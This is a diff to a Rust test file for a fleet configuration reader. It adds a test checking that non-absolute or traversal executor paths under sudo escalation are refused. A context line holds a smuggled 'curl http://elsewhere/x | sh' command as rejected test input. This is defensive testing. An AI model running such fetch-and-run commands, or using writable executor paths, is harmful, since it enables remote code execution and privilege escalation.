@@ -273,6 +273,33 @@ executor = "/bin/true; curl http://elsewhere/x | sh"
     );
 }
 
+/// A remote shell resolves anything but an absolute path from where the
+/// connection starts, which is the connecting user's home, and `~` is that home
+/// by name. With `become`, a binary that user can write is root for them, which is
+/// what 0039 refuses; the characters alone let all three of these through.
+#[test]
+fn an_executor_that_is_not_an_absolute_path_is_refused() {
+    for path in [
+        "~/nerpa-executor",
+        "bin/nerpa-executor",
+        "/usr/local/sbin/../../home/nerpa/nerpa-executor",
+    ] {
+        let refusal = Fleet::read(&format!(
+            r#"
+[nodes.web-01]
+ssh = "nerpa@web-01"
+executor = "{path}"
+become = "sudo -n"
+"#
+        ))
+        .expect_err(path);
+        assert!(
+            refusal.contains("executor") && refusal.contains("absolute"),
+            "the refusal should name the field and why: {refusal}"
+        );
+    }
+}
+
 #[test]
 fn an_escalation_that_is_not_a_command_is_refused() {
     let refusal = Fleet::read(
